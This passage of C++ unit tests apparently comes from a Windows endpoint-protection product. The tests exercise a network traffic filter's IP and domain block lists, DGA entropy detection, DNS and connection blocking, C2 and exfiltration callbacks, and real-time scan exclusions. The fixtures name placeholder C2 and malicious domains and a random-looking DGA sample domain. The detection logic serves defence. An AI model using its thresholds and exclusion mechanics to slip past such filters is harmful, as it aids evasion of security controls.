// ============================================================================
// GROUP 20 — NetworkTrafficFilter IP Blocking
// ============================================================================

TEST_F(NTFFixture, BlockIP_String_IsIPBlocked_ReturnsTrue) {
    RT::NetworkTrafficFilter::Instance().BlockIP("198.51.100.1");
    EXPECT_TRUE(
        RT::NetworkTrafficFilter::Instance().IsIPBlocked(
            RT::IPAddress::FromString("198.51.100.1")));
}

TEST_F(NTFFixture, BlockIP_IPAddressStruct_IsIPBlocked_ReturnsTrue) {
    const RT::IPAddress addr = RT::IPAddress::FromString("198.51.100.2");
    RT::NetworkTrafficFilter::Instance().BlockIP(addr);
    EXPECT_TRUE(RT::NetworkTrafficFilter::Instance().IsIPBlocked(addr));
}

TEST_F(NTFFixture, UnblockIP_ClearsBlock) {
    RT::NetworkTrafficFilter::Instance().BlockIP("198.51.100.3");
    RT::NetworkTrafficFilter::Instance().UnblockIP(
        RT::IPAddress::FromString("198.51.100.3"));
    EXPECT_FALSE(
        RT::NetworkTrafficFilter::Instance().IsIPBlocked(
            RT::IPAddress::FromString("198.51.100.3")));
}

TEST_F(NTFFixture, IsIPBlocked_NeverBlocked_ReturnsFalse) {
    EXPECT_FALSE(
        RT::NetworkTrafficFilter::Instance().IsIPBlocked(
            RT::IPAddress::FromString("203.0.113.99")));
}

TEST_F(NTFFixture, GetBlockedIPs_ContainsBlockedAddress) {
    const RT::IPAddress addr = RT::IPAddress::FromString("198.51.100.4");
    RT::NetworkTrafficFilter::Instance().BlockIP(addr);

    const auto blocked = RT::NetworkTrafficFilter::Instance().GetBlockedIPs();
    const bool found = std::any_of(blocked.begin(), blocked.end(),
        [&](const RT::IPAddress& x){ return x == addr; });
    EXPECT_TRUE(found);
}

TEST_F(NTFFixture, BlockIP_Twice_Idempotent_NoCrash) {
    RT::NetworkTrafficFilter::Instance().BlockIP("198.51.100.5");
    RT::NetworkTrafficFilter::Instance().BlockIP("198.51.100.5");
    EXPECT_TRUE(
        RT::NetworkTrafficFilter::Instance().IsIPBlocked(
            RT::IPAddress::FromString("198.51.100.5")));
}

TEST_F(NTFFixture, UnblockIP_NeverBlocked_NoCrash) {
    RT::NetworkTrafficFilter::Instance().UnblockIP(
        RT::IPAddress::FromString("203.0.113.1"));
    SUCCEED();
}

// ============================================================================
// GROUP 21 — NetworkTrafficFilter Domain Blocking
// ============================================================================

TEST_F(NTFFixture, BlockDomain_IsDomainBlocked_ReturnsTrue) {
    RT::NetworkTrafficFilter::Instance().BlockDomain("malicious.test.shadowstrike");
    EXPECT_TRUE(
        RT::NetworkTrafficFilter::Instance().IsDomainBlocked(
            "malicious.test.shadowstrike"));
}

TEST_F(NTFFixture, UnblockDomain_ClearsBlock) {
    RT::NetworkTrafficFilter::Instance().BlockDomain("evil.test.shadowstrike");
    RT::NetworkTrafficFilter::Instance().UnblockDomain("evil.test.shadowstrike");
    EXPECT_FALSE(
        RT::NetworkTrafficFilter::Instance().IsDomainBlocked("evil.test.shadowstrike"));
}

TEST_F(NTFFixture, IsDomainBlocked_NeverBlocked_ReturnsFalse) {
    EXPECT_FALSE(
        RT::NetworkTrafficFilter::Instance().IsDomainBlocked("google.com"));
}

TEST_F(NTFFixture, GetBlockedDomains_ContainsBlockedDomain) {
    RT::NetworkTrafficFilter::Instance().BlockDomain("c2.test.shadowstrike");
    const auto blocked = RT::NetworkTrafficFilter::Instance().GetBlockedDomains();
    EXPECT_NE(blocked.end(),
        std::find(blocked.begin(), blocked.end(), "c2.test.shadowstrike"));
}

TEST_F(NTFFixture, BlockDomain_Twice_Idempotent_NoCrash) {
    RT::NetworkTrafficFilter::Instance().BlockDomain("repeat.test.shadowstrike");
    RT::NetworkTrafficFilter::Instance().BlockDomain("repeat.test.shadowstrike");
    EXPECT_TRUE(
        RT::NetworkTrafficFilter::Instance().IsDomainBlocked("repeat.test.shadowstrike"));
}

// ============================================================================
// GROUP 22 — NetworkTrafficFilter Rule Management
// ============================================================================

class NTFRuleFixture : public ::testing::Test {
public:
    static void SetUpTestSuite()    { RT::NetworkTrafficFilter::Instance().Initialize(); }
    static void TearDownTestSuite() { RT::NetworkTrafficFilter::Instance().Shutdown();   }

    void TearDown() override {
        RT::NetworkTrafficFilter::Instance().RemoveRule("ntf-rule-001");
        RT::NetworkTrafficFilter::Instance().RemoveRule("ntf-rule-002");
        RT::NetworkTrafficFilter::Instance().RemoveRule("ntf-rule-003");
        RT::NetworkTrafficFilter::Instance().RemoveRule("ntf-rule-004");
        RT::NetworkTrafficFilter::Instance().RemoveRule("ntf-rule-005");
        RT::NetworkTrafficFilter::Instance().RemoveRule("ntf-rule-006");
    }
};

TEST_F(NTFRuleFixture, AddRule_ValidId_ReturnsTrue) {
    EXPECT_TRUE(
        RT::NetworkTrafficFilter::Instance().AddRule(MakeNetworkRule("ntf-rule-001")));
}

TEST_F(NTFRuleFixture, GetRules_ReflectsAddedRule) {
    RT::NetworkTrafficFilter::Instance().AddRule(MakeNetworkRule("ntf-rule-002"));
    const auto rules = RT::NetworkTrafficFilter::Instance().GetRules();
    const bool found = std::any_of(rules.begin(), rules.end(),
        [](const RT::FilterRule& r){ return r.ruleId == "ntf-rule-002"; });
    EXPECT_TRUE(found);
}

TEST_F(NTFRuleFixture, GetRule_ExistingId_ReturnsValue) {
    RT::NetworkTrafficFilter::Instance().AddRule(MakeNetworkRule("ntf-rule-003"));
    const auto opt = RT::NetworkTrafficFilter::Instance().GetRule("ntf-rule-003");
    ASSERT_TRUE(opt.has_value());
    EXPECT_EQ("ntf-rule-003", opt->ruleId);
}

TEST_F(NTFRuleFixture, GetRule_NonExistentId_ReturnsNullopt) {
    EXPECT_FALSE(
        RT::NetworkTrafficFilter::Instance().GetRule("no-such-rule").has_value());
}

TEST_F(NTFRuleFixture, RemoveRule_ExistingId_ReturnsTrue) {
    RT::NetworkTrafficFilter::Instance().AddRule(MakeNetworkRule("ntf-rule-004"));
    EXPECT_TRUE(RT::NetworkTrafficFilter::Instance().RemoveRule("ntf-rule-004"));
}

TEST_F(NTFRuleFixture, RemoveRule_NonExistentId_ReturnsFalse) {
    EXPECT_FALSE(
        RT::NetworkTrafficFilter::Instance().RemoveRule("ntf-no-such-rule-xyz"));
}

TEST_F(NTFRuleFixture, SetRuleEnabled_False_ReflectedInGetRule) {
    RT::NetworkTrafficFilter::Instance().AddRule(MakeNetworkRule("ntf-rule-005"));
    RT::NetworkTrafficFilter::Instance().SetRuleEnabled("ntf-rule-005", false);

    const auto opt = RT::NetworkTrafficFilter::Instance().GetRule("ntf-rule-005");
    ASSERT_TRUE(opt.has_value());
    EXPECT_FALSE(opt->enabled);
}

TEST_F(NTFRuleFixture, AddMultipleRules_GetRules_CountIncreases) {
    const size_t before = RT::NetworkTrafficFilter::Instance().GetRules().size();
    RT::NetworkTrafficFilter::Instance().AddRule(MakeNetworkRule("ntf-rule-005"));
    RT::NetworkTrafficFilter::Instance().AddRule(MakeNetworkRule("ntf-rule-006"));
    EXPECT_EQ(before + 2u,
        RT::NetworkTrafficFilter::Instance().GetRules().size());
}

// ============================================================================
// GROUP 23 — NetworkTrafficFilter DGA Entropy Analysis
// ============================================================================

TEST_F(NTFFixture, CalculateDomainEntropy_Benign_BelowThreshold) {
    const double e =
        RT::NetworkTrafficFilter::Instance().CalculateDomainEntropy("google.com");
    EXPECT_LT(e, RT::NetworkFilterConstants::DGA_ENTROPY_THRESHOLD);
}

TEST_F(NTFFixture, CalculateDomainEntropy_DGALooking_AboveThreshold) {
    // High-entropy random-consonant string characteristic of DGA.
    const double e =
        RT::NetworkTrafficFilter::Instance().CalculateDomainEntropy(
            "xkqjzpfvwbnmdlr.com");
    EXPECT_GE(e, RT::NetworkFilterConstants::DGA_ENTROPY_THRESHOLD);
}

TEST_F(NTFFixture, CalculateDomainEntropy_EmptyString_ReturnsZero) {
    EXPECT_DOUBLE_EQ(0.0,
        RT::NetworkTrafficFilter::Instance().CalculateDomainEntropy(""));
}

TEST_F(NTFFixture, CalculateDomainEntropy_SingleChar_ReturnsZero) {
    EXPECT_DOUBLE_EQ(0.0,
        RT::NetworkTrafficFilter::Instance().CalculateDomainEntropy("a"));
}

TEST_F(NTFFixture, CalculateDomainEntropy_AllSameChar_ReturnsZero) {
    EXPECT_DOUBLE_EQ(0.0,
        RT::NetworkTrafficFilter::Instance().CalculateDomainEntropy("aaaaaaaaaa"));
}

TEST_F(NTFFixture, CalculateDomainEntropy_IsNonNegative) {
    EXPECT_GE(
        RT::NetworkTrafficFilter::Instance().CalculateDomainEntropy("example.com"),
        0.0);
}

TEST_F(NTFFixture, IsDGADomain_Benign_ReturnsFalse) {
    EXPECT_FALSE(
        RT::NetworkTrafficFilter::Instance().IsDGADomain("microsoft.com"));
    EXPECT_FALSE(
        RT::NetworkTrafficFilter::Instance().IsDGADomain("google.com"));
}

TEST_F(NTFFixture, IsDGADomain_HighEntropy_ReturnsTrue) {
    EXPECT_TRUE(
        RT::NetworkTrafficFilter::Instance().IsDGADomain("xkqjzpfvwbnmdlr.com"));
}

TEST_F(NTFFixture, IsDGADomain_Empty_NoCrash) {
    EXPECT_NO_THROW(
        RT::NetworkTrafficFilter::Instance().IsDGADomain(""));
}

// ============================================================================
// GROUP 24 — NetworkTrafficFilter Connection Events
// ============================================================================

TEST_F(NTFFixture, OnConnectionAttempt_BlockedIP_ReturnsBlock) {
    const std::string blockedAddr = "198.51.100.10";
    RT::NetworkTrafficFilter::Instance().BlockIP(blockedAddr);

    RT::NetworkConnection conn{};
    conn.tuple.remote.address = RT::IPAddress::FromString(blockedAddr);
    conn.tuple.remote.port    = 443;
    conn.processId            = 1000u;

    const RT::FilterAction action =
        RT::NetworkTrafficFilter::Instance().OnConnectionAttempt(conn);
    EXPECT_EQ(RT::FilterAction::Block, action);
}

TEST_F(NTFFixture, OnConnectionAttempt_AllowedIP_DoesNotReturnBlock) {
    RT::NetworkConnection conn{};
    conn.tuple.remote.address = RT::IPAddress::FromString("203.0.113.1");
    conn.tuple.remote.port    = 80;
    conn.processId            = 1000u;

    const RT::FilterAction action =
        RT::NetworkTrafficFilter::Instance().OnConnectionAttempt(conn);
    EXPECT_NE(RT::FilterAction::Block, action);
}

TEST_F(NTFFixture, OnConnectionEstablished_NoCrash) {
    RT::NetworkConnection conn{};
    conn.connectionId         = 1u;
    conn.tuple.remote.address = RT::IPAddress::FromString("203.0.113.2");
    conn.tuple.remote.port    = 80;
    conn.processId            = 2000u;
    EXPECT_NO_THROW(
        RT::NetworkTrafficFilter::Instance().OnConnectionEstablished(conn));
}

TEST_F(NTFFixture, OnConnectionClosed_UnknownId_NoCrash) {
    EXPECT_NO_THROW(
        RT::NetworkTrafficFilter::Instance().OnConnectionClosed(0u));
    EXPECT_NO_THROW(
        RT::NetworkTrafficFilter::Instance().OnConnectionClosed(
            std::numeric_limits<uint64_t>::max()));
}

TEST_F(NTFFixture, KillConnection_ZeroId_ReturnsFalse) {
    EXPECT_FALSE(RT::NetworkTrafficFilter::Instance().KillConnection(0u));
}

TEST_F(NTFFixture, KillProcessConnections_ZeroPid_ReturnsZero) {
    EXPECT_EQ(0u,
        RT::NetworkTrafficFilter::Instance().KillProcessConnections(0u));
}

TEST_F(NTFFixture, GetActiveConnections_WhenNoDriver_ReturnsEmptyOrSmallSet) {
    // Without WFP driver the connection table must either be empty or only
    // contain pre-existing connections (no crash).
    EXPECT_NO_THROW(RT::NetworkTrafficFilter::Instance().GetActiveConnections());
}

TEST_F(NTFFixture, GetConnectionHistory_NoCrash) {
    EXPECT_NO_THROW(
        RT::NetworkTrafficFilter::Instance().GetConnectionHistory(100u));
}

TEST_F(NTFFixture, GetConnection_ZeroId_ReturnsNullopt) {
    EXPECT_FALSE(
        RT::NetworkTrafficFilter::Instance().GetConnection(0u).has_value());
}

TEST_F(NTFFixture, GetProcessConnections_ZeroPid_ReturnsEmptyVector) {
    EXPECT_TRUE(
        RT::NetworkTrafficFilter::Instance().GetProcessConnections(0u).empty());
}

TEST_F(NTFFixture, GetRecentEvents_NoCrash) {
    EXPECT_NO_THROW(RT::NetworkTrafficFilter::Instance().GetRecentEvents(100u));
}

// ============================================================================
// GROUP 25 — NetworkTrafficFilter DNS Query Handling
// ============================================================================

TEST_F(NTFFixture, OnDNSQuery_BlockedDomain_ReturnsBlock) {
    RT::NetworkTrafficFilter::Instance().BlockDomain("c2query.test.shadowstrike");

    RT::DNSQueryEvent query{};
    query.domain = "c2query.test.shadowstrike";
    query.processId = 3000u;

    const RT::FilterAction action =
        RT::NetworkTrafficFilter::Instance().OnDNSQuery(query);
    EXPECT_EQ(RT::FilterAction::Block, action);
}

TEST_F(NTFFixture, OnDNSQuery_AllowedDomain_DoesNotReturnBlock) {
    RT::DNSQueryEvent query{};
    query.domain = "benign.example.com";
    query.processId = 3001u;

    const RT::FilterAction action =
        RT::NetworkTrafficFilter::Instance().OnDNSQuery(query);
    EXPECT_NE(RT::FilterAction::Block, action);
}

TEST_F(NTFFixture, GetRecentDNSQueries_AfterQuery_NonEmptyOrNoCrash) {
    RT::DNSQueryEvent query{};
    query.domain = "test-dns.example.com";
    query.processId = 3002u;
    RT::NetworkTrafficFilter::Instance().OnDNSQuery(query);

    EXPECT_NO_THROW(
        RT::NetworkTrafficFilter::Instance().GetRecentDNSQueries(50u));
}

TEST_F(NTFFixture, GetProcessDNSQueries_UnknownPid_ReturnsEmpty) {
    EXPECT_TRUE(
        RT::NetworkTrafficFilter::Instance().GetProcessDNSQueries(
            0xDEADBEEFu).empty());
}

// ============================================================================
// GROUP 26 — NetworkTrafficFilter Callbacks
// ============================================================================

TEST_F(NTFFixture, RegisterConnectionCallback_ReturnsNonZeroId) {
    uint64_t id = RT::NetworkTrafficFilter::Instance().RegisterConnectionCallback(
        [](const RT::NetworkConnection&) { return RT::FilterAction::Allow; });
    EXPECT_NE(0u, id);
    RT::NetworkTrafficFilter::Instance().UnregisterConnectionCallback(id);
}

TEST_F(NTFFixture, RegisterEventCallback_ReturnsNonZeroId) {
    uint64_t id = RT::NetworkTrafficFilter::Instance().RegisterEventCallback(
        [](const RT::NetworkEvent&) {});
    EXPECT_NE(0u, id);
    RT::NetworkTrafficFilter::Instance().UnregisterEventCallback(id);
}

TEST_F(NTFFixture, RegisterDNSCallback_ReturnsNonZeroId) {
    uint64_t id = RT::NetworkTrafficFilter::Instance().RegisterDNSCallback(
        [](const RT::DNSQueryEvent&) { return RT::FilterAction::Allow; });
    EXPECT_NE(0u, id);
    RT::NetworkTrafficFilter::Instance().UnregisterDNSCallback(id);
}

TEST_F(NTFFixture, RegisterC2Callback_ReturnsNonZeroId) {
    uint64_t id = RT::NetworkTrafficFilter::Instance().RegisterC2Callback(
        [](const RT::BeaconAnalysis&) {});
    EXPECT_NE(0u, id);
    RT::NetworkTrafficFilter::Instance().UnregisterC2Callback(id);
}

TEST_F(NTFFixture, RegisterExfiltrationCallback_ReturnsNonZeroId) {
    uint64_t id = RT::NetworkTrafficFilter::Instance().RegisterExfiltrationCallback(
        [](uint32_t, const RT::NetworkEndpoint&, size_t)
            { return RT::FilterAction::LogOnly; });
    EXPECT_NE(0u, id);
    RT::NetworkTrafficFilter::Instance().UnregisterExfiltrationCallback(id);
}

TEST_F(NTFFixture, UnregisterCallback_InvalidId_ReturnsFalse_NoCrash) {
    EXPECT_FALSE(
        RT::NetworkTrafficFilter::Instance().UnregisterConnectionCallback(0u));
    EXPECT_FALSE(
        RT::NetworkTrafficFilter::Instance().UnregisterDNSCallback(
            std::numeric_limits<uint64_t>::max()));
}

TEST_F(NTFFixture, DNSCallback_FiredOn_OnDNSQuery_WithBlockedDomain) {
    std::atomic<bool> fired{ false };

    uint64_t cbId = RT::NetworkTrafficFilter::Instance().RegisterDNSCallback(
        [&](const RT::DNSQueryEvent& ev) -> RT::FilterAction {
            if (ev.domain == "cb-test.shadowstrike") {
                fired.store(true, std::memory_order_release);
            }
            return RT::FilterAction::Allow;
        });

    RT::DNSQueryEvent ev{};
    ev.domain    = "cb-test.shadowstrike";
    ev.processId = 4000u;
    RT::NetworkTrafficFilter::Instance().OnDNSQuery(ev);

    EXPECT_TRUE(fired.load(std::memory_order_acquire));
    RT::NetworkTrafficFilter::Instance().UnregisterDNSCallback(cbId);
}

TEST_F(NTFFixture, ConnectionCallback_FiredOn_OnConnectionAttempt) {
    std::atomic<bool> fired{ false };

    uint64_t cbId = RT::NetworkTrafficFilter::Instance().RegisterConnectionCallback(
        [&](const RT::NetworkConnection& conn) -> RT::FilterAction {
            if (conn.processId == 4001u) {
                fired.store(true, std::memory_order_release);
            }
            return RT::FilterAction::Allow;
        });

    RT::NetworkConnection conn{};
    conn.tuple.remote.address = RT::IPAddress::FromString("203.0.113.50");
    conn.tuple.remote.port    = 80;
    conn.processId            = 4001u;
    RT::NetworkTrafficFilter::Instance().OnConnectionAttempt(conn);

    EXPECT_TRUE(fired.load(std::memory_order_acquire));
    RT::NetworkTrafficFilter::Instance().UnregisterConnectionCallback(cbId);
}

TEST_F(NTFFixture, GetStats_ReturnsCopyableStruct) {
    const RT::NetworkFilterStats s =
        RT::NetworkTrafficFilter::Instance().GetStats();
    EXPECT_GE(s.connectionsAllowed, 0u);
}

TEST_F(NTFFixture, ResetStats_ZerosFields) {
    RT::NetworkTrafficFilter::Instance().ResetStats();
    const RT::NetworkFilterStats s =
        RT::NetworkTrafficFilter::Instance().GetStats();
    EXPECT_EQ(0u, s.connectionsBlocked);
}

// ============================================================================
// GROUP 27 — RealTimeProtection Singleton & State
// ============================================================================

class RTPFixture : public ::testing::Test {
public:
    void TearDown() override {
        RT::RealTimeProtection::Instance().ClearAllExclusions();
        RT::RealTimeProtection::Instance().ClearVerdictCache();
        RT::RealTimeProtection::Instance().ResetStatistics();
    }
};

TEST_F(RTPFixture, Instance_ReturnsSameReference) {
    RT::RealTimeProtection& a = RT::RealTimeProtection::Instance();
    RT::RealTimeProtection& b = RT::RealTimeProtection::Instance();
    EXPECT_EQ(&a, &b);
}

TEST_F(RTPFixture, GetState_BeforeStart_IsNotActive) {
    const RT::ProtectionState st = RT::RealTimeProtection::Instance().GetState();
    EXPECT_NE(RT::ProtectionState::ACTIVE, st);
}

TEST_F(RTPFixture, IsActive_BeforeStart_ReturnsFalse) {
    EXPECT_FALSE(RT::RealTimeProtection::Instance().IsActive());
}

TEST_F(RTPFixture, Start_WithoutDriver_DoesNotCrash) {
    // Start may fail gracefully when the kernel driver is absent.
    // The call must not throw or crash.
    EXPECT_NO_THROW(RT::RealTimeProtection::Instance().Start());
}

TEST_F(RTPFixture, Stop_Idempotent_NoCrash) {
    RT::RealTimeProtection::Instance().Stop();
    RT::RealTimeProtection::Instance().Stop();
    SUCCEED();
}

TEST_F(RTPFixture, Restart_NeverStarted_NoCrash) {
    EXPECT_NO_THROW(RT::RealTimeProtection::Instance().Restart());
}

TEST_F(RTPFixture, GetStatus_NoCrash_FieldsCoherent) {
    const RT::ProtectionStatus st = RT::RealTimeProtection::Instance().GetStatus();
    EXPECT_NE(RT::ProtectionState::ACTIVE, st.state);   // no driver
    EXPECT_FALSE(st.isProtected);                        // driver absent
}

// ============================================================================
// GROUP 28 — RealTimeProtection Config & Mode
// ============================================================================

TEST_F(RTPFixture, UpdateConfig_RoundTrip_Mode) {
    RT::RTPConfig cfg = RT::RTPConfig::CreateDefault();
    cfg.mode = RT::ProtectionMode::MONITOR_ONLY;
    RT::RealTimeProtection::Instance().UpdateConfig(cfg);

    const RT::RTPConfig got = RT::RealTimeProtection::Instance().GetConfig();
    EXPECT_EQ(RT::ProtectionMode::MONITOR_ONLY, got.mode);
}

TEST_F(RTPFixture, UpdateConfig_RoundTrip_ScanOnWrite) {
    RT::RTPConfig cfg = RT::RTPConfig::CreateDefault();
    cfg.scanOnWrite = true;
    RT::RealTimeProtection::Instance().UpdateConfig(cfg);
    EXPECT_TRUE(RT::RealTimeProtection::Instance().GetConfig().scanOnWrite);
}

TEST_F(RTPFixture, SetProtectionMode_RoundTrip) {
    RT::RealTimeProtection::Instance().SetProtectionMode(
        RT::ProtectionMode::BLOCK_SUSPICIOUS);
    EXPECT_EQ(RT::ProtectionMode::BLOCK_SUSPICIOUS,
        RT::RealTimeProtection::Instance().GetProtectionMode());

    RT::RealTimeProtection::Instance().SetProtectionMode(
        RT::ProtectionMode::BLOCK_KNOWN);
}

TEST_F(RTPFixture, UpdateConfig_HighSecurity_PersistsMode) {
    RT::RealTimeProtection::Instance().UpdateConfig(
        RT::RTPConfig::CreateHighSecurity());
    const RT::RTPConfig got = RT::RealTimeProtection::Instance().GetConfig();
    EXPECT_GE(static_cast<uint8_t>(got.mode),
              static_cast<uint8_t>(RT::ProtectionMode::BLOCK_SUSPICIOUS));
}

TEST_F(RTPFixture, UpdateConfig_ExclusionLists_Persist) {
    RT::RTPConfig cfg = RT::RTPConfig::CreateDefault();
    cfg.excludedPaths     = { L"C:\\Logs", L"C:\\Temp" };
    cfg.excludedProcesses = { L"backup.exe" };
    cfg.excludedHashes    = { L"AABBCCDD" };
    RT::RealTimeProtection::Instance().UpdateConfig(cfg);

    const RT::RTPConfig got = RT::RealTimeProtection::Instance().GetConfig();
    ASSERT_EQ(2u, got.excludedPaths.size());
    EXPECT_EQ(L"C:\\Logs", got.excludedPaths[0]);
    EXPECT_EQ(1u, got.excludedProcesses.size());
    EXPECT_EQ(1u, got.excludedHashes.size());
}

// ============================================================================
// GROUP 29 — RealTimeProtection Exclusion Management
// ============================================================================

TEST_F(RTPFixture, AddPathExclusion_RemovePathExclusion_RoundTrip) {
    RT::RealTimeProtection::Instance().AddPathExclusion(L"C:\\SafeDir");
    const auto excl = RT::RealTimeProtection::Instance().GetExclusions();
    EXPECT_NE(excl.end(), excl.find(L"paths"));

    RT::RealTimeProtection::Instance().RemovePathExclusion(L"C:\\SafeDir");
}

TEST_F(RTPFixture, AddProcessExclusion_GetExclusions_ContainsEntry) {
    RT::RealTimeProtection::Instance().AddProcessExclusion(L"trusted.exe");
    const auto excl = RT::RealTimeProtection::Instance().GetExclusions();
    EXPECT_FALSE(excl.empty());
    RT::RealTimeProtection::Instance().RemoveProcessExclusion(L"trusted.exe");
}

TEST_F(RTPFixture, AddHashExclusion_RemoveHashExclusion_RoundTrip) {
    const std::wstring hash =
        L"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
    RT::RealTimeProtection::Instance().AddHashExclusion(hash);
    RT::RealTimeProtection::Instance().RemoveHashExclusion(hash);
    SUCCEED();
}

TEST_F(RTPFixture, AddTemporaryPidExclusion_NoCrash) {
    RT::RealTimeProtection::Instance().AddTemporaryPidExclusion(
        static_cast<uint32_t>(::GetCurrentProcessId()), 1000u);
    SUCCEED();
}

TEST_F(RTPFixture, ClearAllExclusions_EmptiesAll) {
    RT::RealTimeProtection::Instance().AddPathExclusion(L"C:\\A");
    RT::RealTimeProtection::Instance().AddProcessExclusion(L"proc.exe");
    RT::RealTimeProtection::Instance().ClearAllExclusions();

    const auto excl = RT::RealTimeProtection::Instance().GetExclusions();
    for (const auto& [key, vec] : excl) {
        EXPECT_TRUE(vec.empty()) << "Exclusion list '" << key << "' is not empty.";
    }
}

TEST_F(RTPFixture, AddPathExclusion_Duplicate_NoCrash) {
    RT::RealTimeProtection::Instance().AddPathExclusion(L"C:\\Dup");
    RT::RealTimeProtection::Instance().AddPathExclusion(L"C:\\Dup");
    RT::RealTimeProtection::Instance().ClearAllExclusions();
    SUCCEED();
}

// ============================================================================
// GROUP 30 — RealTimeProtection Verdict Cache
// ============================================================================

TEST_F(RTPFixture, GetCacheSize_FreshSingleton_ReturnsZero) {
    RT::RealTimeProtection::Instance().ClearVerdictCache();
    EXPECT_EQ(0u, RT::RealTimeProtection::Instance().GetCacheSize());
}

TEST_F(RTPFixture, ClearVerdictCache_WhenEmpty_NoCrash) {
    RT::RealTimeProtection::Instance().ClearVerdictCache();
    RT::RealTimeProtection::Instance().ClearVerdictCache();
    SUCCEED();
}

TEST_F(RTPFixture, QueryVerdictCache_UnknownHash_ReturnsNullopt) {
    EXPECT_FALSE(
        RT::RealTimeProtection::Instance().QueryVerdictCache(
            HashBytesFromHex(
                "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"))
        .has_value());
}

TEST_F(RTPFixture, InvalidateCacheEntry_UnknownHash_NoCrash) {
    RT::RealTimeProtection::Instance().InvalidateCacheEntry(
        HashBytesFromHex(
            "0000000000000000000000000000000000000000000000000000000000000000"));
    SUCCEED();
}

// ============================================================================
// GROUP 31 — RealTimeProtection Statistics
// ============================================================================

TEST_F(RTPFixture, GetStatistics_NoCrash) {
    const RT::RTPStatistics& stats =
        RT::RealTimeProtection::Instance().GetStatistics();
    EXPECT_GE(stats.totalScans.load(std::memory_order_relaxed), 0u);
}

TEST_F(RTPFixture, ResetStatistics_Safe_NoCrash) {
    RT::RealTimeProtection::Instance().ResetStatistics();
    const RT::RTPStatistics& stats =
        RT::RealTimeProtection::Instance().GetStatistics();
    EXPECT_EQ(0u,
        stats.totalScans.load(std::memory_order_relaxed));
}

TEST_F(RTPFixture, GetPerformanceMetrics_NoCrash) {
    EXPECT_NO_THROW(RT::RealTimeProtection::Instance().GetPerformanceMetrics());
}

TEST_F(RTPFixture, GetRecentThreats_InitiallyEmpty) {
    RT::RealTimeProtection::Instance().ResetStatistics();
    const auto threats = RT::RealTimeProtection::Instance().GetRecentThreats(100u);
    EXPECT_TRUE(threats.empty());
}

TEST_F(RTPFixture, GetRecentThreats_ZeroMaxEvents_ReturnsEmpty) {
    const auto threats = RT::RealTimeProtection::Instance().GetRecentThreats(0u);
    EXPECT_TRUE(threats.empty());
}

TEST_F(RTPFixture, PerformHealthCheck_NoCrash) {
    EXPECT_NO_THROW(RT::RealTimeProtection::Instance().PerformHealthCheck());
}

// ============================================================================
// GROUP 32 — RealTimeProtection Callback Registration
// ============================================================================

TEST_F(RTPFixture, RegisterFileScanCallback_ReturnsNonZeroId) {
    uint64_t id = RT::RealTimeProtection::Instance().RegisterFileScanCallback(
        [](const RT::RTPFileScanRequest&, RT::ScanResult&) { return false; });
    EXPECT_NE(0u, id);
    RT::RealTimeProtection::Instance().UnregisterCallback(id);
}

TEST_F(RTPFixture, RegisterProcessCreateCallback_ReturnsNonZeroId) {
    uint64_t id = RT::RealTimeProtection::Instance().RegisterProcessCreateCallback(
        [](const RT::RTPProcessNotifyRequest&, bool&) {});
    EXPECT_NE(0u, id);
    RT::RealTimeProtection::Instance().UnregisterCallback(id);
}

TEST_F(RTPFixture, RegisterThreatDetectionCallback_ReturnsNonZeroId) {
    uint64_t id = RT::RealTimeProtection::Instance().RegisterThreatDetectionCallback(
        [](const RT::ThreatEvent&) {});
    EXPECT_NE(0u, id);
    RT::RealTimeProtection::Instance().UnregisterCallback(id);
}

TEST_F(RTPFixture, RegisterStateChangeCallback_ReturnsNonZeroId) {
    uint64_t id = RT::RealTimeProtection::Instance().RegisterStateChangeCallback(
        [](RT::ProtectionState, RT::ProtectionState, std::wstring_view) {});
    EXPECT_NE(0u, id);
    RT::RealTimeProtection::Instance().UnregisterCallback(id);
}

TEST_F(RTPFixture, RegisterComponentStatusCallback_ReturnsNonZeroId) {
    uint64_t id =
        RT::RealTimeProtection::Instance().RegisterComponentStatusCallback(
            [](RT::ComponentType,
               RT::ProtectionComponentState,
               RT::ProtectionComponentState) {});
    EXPECT_NE(0u, id);
    RT::RealTimeProtection::Instance().UnregisterCallback(id);
}

TEST_F(RTPFixture, RegisterNotificationCallback_ReturnsNonZeroId) {
    uint64_t id = RT::RealTimeProtection::Instance().RegisterNotificationCallback(
        [](RT::NotificationSeverity,
           std::wstring_view,
           std::wstring_view,
           const std::optional<RT::ThreatEvent>&) {});
    EXPECT_NE(0u, id);
    RT::RealTimeProtection::Instance().UnregisterCallback(id);
}

TEST_F(RTPFixture, RegisterMultipleCallbacks_AllDistinctIds) {
    uint64_t id1 = RT::RealTimeProtection::Instance().RegisterThreatDetectionCallback(
        [](const RT::ThreatEvent&) {});
    uint64_t id2 = RT::RealTimeProtection::Instance().RegisterThreatDetectionCallback(
        [](const RT::ThreatEvent&) {});
    uint64_t id3 = RT::RealTimeProtection::Instance().RegisterStateChangeCallback(
        [](RT::ProtectionState, RT::ProtectionState, std::wstring_view) {});

    EXPECT_NE(id1, id2);
    EXPECT_NE(id1, id3);
    EXPECT_NE(id2, id3);

    RT::RealTimeProtection::Instance().UnregisterCallback(id1);
    RT::RealTimeProtection::Instance().UnregisterCallback(id2);
    RT::RealTimeProtection::Instance().UnregisterCallback(id3);
}

TEST_F(RTPFixture, UnregisterCallback_ValidId_ReturnsTrue) {
    uint64_t id = RT::RealTimeProtection::Instance().RegisterThreatDetectionCallback(
        [](const RT::ThreatEvent&) {});
    EXPECT_TRUE(RT::RealTimeProtection::Instance().UnregisterCallback(id));
}

TEST_F(RTPFixture, UnregisterCallback_ZeroId_ReturnsFalse) {
    EXPECT_FALSE(RT::RealTimeProtection::Instance().UnregisterCallback(0u));
}

TEST_F(RTPFixture, UnregisterCallback_MaxId_ReturnsFalseOrFalse) {
    EXPECT_FALSE(RT::RealTimeProtection::Instance().UnregisterCallback(
        std::numeric_limits<uint64_t>::max()));
}

// ============================================================================
// GROUP 33 — Cross-Component Integration & Concurrency
// ============================================================================

class CrossComponentFixture : public ::testing::Test {
public:
    static void SetUpTestSuite() {
        RT::FileSystemFilter::Instance().Initialize();
        RT::ProcessCreationMonitor::Instance().Initialize();
        RT::NetworkTrafficFilter::Instance().Initialize();
    }
    static void TearDownTestSuite() {
        RT::NetworkTrafficFilter::Instance().Shutdown();
        RT::ProcessCreationMonitor::Instance().Shutdown();
        RT::FileSystemFilter::Instance().Shutdown();
    }
};

TEST_F(CrossComponentFixture, GetFileSystemFilter_SameAsDirectInstance) {
